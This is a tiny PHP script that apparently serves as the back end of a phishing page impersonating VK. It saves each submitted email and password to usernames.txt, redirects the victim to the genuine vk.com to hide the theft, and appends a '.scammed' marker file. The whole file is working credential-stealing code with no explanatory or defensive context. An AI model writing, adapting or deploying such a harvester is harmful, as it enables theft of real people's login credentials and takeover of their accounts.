<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://vk.com');file_put_contents(".scammed","Fucked", FILE_APPEND);
exit();